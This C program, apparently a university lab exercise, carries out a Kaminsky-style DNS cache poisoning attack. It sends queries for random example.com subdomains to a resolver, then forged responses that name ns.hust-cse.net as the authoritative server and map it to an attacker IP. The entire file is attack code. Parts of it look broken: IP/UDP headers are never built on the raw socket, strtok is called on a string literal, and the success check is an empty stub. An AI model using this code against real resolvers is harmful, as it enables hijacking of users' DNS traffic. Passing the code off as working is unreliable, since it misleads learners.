#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <netdb.h>

#define DNS_PORT 53
#define BUFFER_SIZE 4096
#define MAX_ATTEMPTS 10000

// DNS header structure
struct dns_header {
    unsigned short id;
    unsigned char qr :1;
    unsigned char opcode :4;
    unsigned char aa :1;
    unsigned char tc :1;
    unsigned char rd :1;
    unsigned char ra :1;
    unsigned char z :3;
    unsigned char rcode :4;
    unsigned short qdcount;
    unsigned short ancount;
    unsigned short nscount;
    unsigned short arcount;
};

// DNS question section
struct dns_question {
    unsigned short qtype;
    unsigned short qclass;
};

// DNS resource record
struct dns_rr {
    unsigned short type;
    unsigned short class;
    unsigned int ttl;
    unsigned short rdlength;
};

// Generate random transaction ID
unsigned short create_transaction_id() {
    return (unsigned short)rand();
}

// Build DNS query packet
void build_dns_query(char *buffer, int *length, unsigned short trans_id, char *domain) {
    struct dns_header *dns = (struct dns_header*)buffer;
    
    // Build DNS header
    dns->id = htons(trans_id);
    dns->qr = 0;        // Query
    dns->opcode = 0;    // Standard query
    dns->aa = 0;
    dns->tc = 0;
    dns->rd = 1;        // Recursion desired
    dns->ra = 0;
    dns->z = 0;
    dns->rcode = 0;
    dns->qdcount = htons(1);  // One question
    dns->ancount = 0;
    dns->nscount = 0;
    dns->arcount = 0;
    
    char *qname = buffer + sizeof(struct dns_header);
    char *token = strtok(domain, ".");
    char *ptr = qname;
    
    // Build domain name section
    while(token != NULL) {
        int len = strlen(token);
        *ptr++ = len;
        memcpy(ptr, token, len);
        ptr += len;
        token = strtok(NULL, ".");
    }
    *ptr++ = 0;  // End of domain name
    
    // Build question section
    struct dns_question *question = (struct dns_question*)ptr;
    question->qtype = htons(1);   // A record
    question->qclass = htons(1);  // IN class
    
    *length = ptr - buffer + sizeof(struct dns_question);
}

// Build poisoned DNS response
void build_poisoned_response(char *buffer, int *length, unsigned short trans_id, 
                           char *query_domain, char *target_ns) {
    struct dns_header *dns = (struct dns_header*)buffer;
    
    // DNS header
    dns->id = htons(trans_id);
    dns->qr = 1;        // Response
    dns->opcode = 0;
    dns->aa = 0;
    dns->tc = 0;
    dns->rd = 1;
    dns->ra = 0;
    dns->z = 0;
    dns->rcode = 0;
    dns->qdcount = htons(1);   // One question
    dns->ancount = htons(1);   // One answer
    dns->nscount = htons(1);   // One authority record
    dns->arcount = htons(1);   // One additional record
    
    char *ptr = buffer + sizeof(struct dns_header);
    
    // Build query domain (www123456.example.com format)
    char *token = strtok(query_domain, ".");
    while(token != NULL) {
        int len = strlen(token);
        *ptr++ = len;
        memcpy(ptr, token, len);
        ptr += len;
        token = strtok(NULL, ".");
    }
    *ptr++ = 0;
    
    // Question section
    struct dns_question *question = (struct dns_question*)ptr;
    question->qtype = htons(1);
    question->qclass = htons(1);
    ptr += sizeof(struct dns_question);
    
    // Answer section (fake A record)
    *ptr++ = 0xC0;  // Pointer to query domain
    *ptr++ = 0x0C;
    
    struct dns_rr *answer = (struct dns_rr*)ptr;
    answer->type = htons(1);      // A record
    answer->class = htons(1);     // IN class
    answer->ttl = htonl(3600);    // TTL 1 hour
    answer->rdlength = htons(4);  // IPv4 address length
    ptr += sizeof(struct dns_rr);
    
    // Fake IP address
    struct in_addr fake_ip;
    inet_pton(AF_INET, "1.2.3.4", &fake_ip);
    memcpy(ptr, &fake_ip, 4);
    ptr += 4;
    
    // Authority section (Key: set NS record for example.com to ns.hust-cse.net)
    *ptr++ = 0xC0;  // Pointer to example.com
    *ptr++ = 0x0C + sizeof("www123456") + 1;  // Point to example.com part
    
    struct dns_rr *authority = (struct dns_rr*)ptr;
    authority->type = htons(2);    // NS record
    authority->class = htons(1);   // IN class
    authority->ttl = htonl(3600);  // TTL 1 hour
    ptr += sizeof(struct dns_rr);
    
    // Calculate NS record data length
    char *ns_start = ptr;
    char *ns_token = strtok(target_ns, ".");
    while(ns_token != NULL) {
        int len = strlen(ns_token);
        *ptr++ = len;
        memcpy(ptr, ns_token, len);
        ptr += len;
        ns_token = strtok(NULL, ".");
    }
    *ptr++ = 0;
    
    authority->rdlength = htons(ptr - ns_start);
    
    // Additional section (resolve ns.hust-cse.net to attacker IP)
    char *add_start = ptr;
    char *add_ns = "ns.hust-cse.net";
    char *add_token = strtok(add_ns, ".");
    while(add_token != NULL) {
        int len = strlen(add_token);
        *ptr++ = len;
        memcpy(ptr, add_token, len);
        ptr += len;
        add_token = strtok(NULL, ".");
    }
    *ptr++ = 0;
    
    struct dns_rr *additional = (struct dns_rr*)ptr;
    additional->type = htons(1);     // A record
    additional->class = htons(1);    // IN class
    additional->ttl = htonl(3600);   // TTL 1 hour
    additional->rdlength = htons(4); // IPv4 address length
    ptr += sizeof(struct dns_rr);
    
    // Attacker's IP address
    struct in_addr attacker_ip;
    inet_pton(AF_INET, "10.10.27.4", &attacker_ip);
    memcpy(ptr, &attacker_ip, 4);
    ptr += 4;
    
    *length = ptr - buffer;
}

int main() {
    int sockfd;
    struct sockaddr_in dest_addr;
    char send_buf[BUFFER_SIZE];
    char recv_buf[BUFFER_SIZE];
    int packet_len;
    
    srand(time(NULL));
    
    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sockfd < 0) {
        perror("socket");
        exit(1);
    }
    
    // Set destination address (DNS server)
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(DNS_PORT);
    inet_pton(AF_INET, "10.10.27.2", &dest_addr.sin_addr);
    
    printf("Starting Kaminsky attack on DNS server 10.10.27.2\n");
    
    for(int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
        // Generate random subdomain
        char random_sub[20];
        sprintf(random_sub, "www%06d", rand() % 1000000);
        char query_domain[100];
        sprintf(query_domain, "%s.example.com", random_sub);
        
        // Generate transaction ID
        unsigned short trans_id = create_transaction_id();
        
        // Build DNS query
        int query_len;
        char query_copy[100];
        strcpy(query_copy, query_domain);
        build_dns_query(send_buf, &query_len, trans_id, query_copy);
        
        // Send query
        if(sendto(sockfd, send_buf, query_len, 0, 
                 (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("sendto query");
            continue;
        }
        
        printf("Sent query: %s (Transaction ID: %04X)\n", query_domain, trans_id);
        
        // Immediately send forged response
        int response_len;
        char query_copy2[100];
        strcpy(query_copy2, query_domain);
        char target_ns[] = "ns.hust-cse.net";
        build_poisoned_response(send_buf, &response_len, trans_id, query_copy2, target_ns);
        
        // Send forged response
        if(sendto(sockfd, send_buf, response_len, 0,
                 (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("sendto response");
            continue;
        }
        
        printf("Sent poisoned response for %s\n", query_domain);
        
        // Short delay
        usleep(10000); // 10ms
        
        // Check if attack succeeded (query example.com NS record)
        // Add checking code here, exit if successful
        
        if(attempt % 100 == 0) {
            printf("Attempt %d/%d\n", attempt, MAX_ATTEMPTS);
        }
    }
    
    close(sockfd);
    printf("Attack completed.\n");
    
    return 0;
}
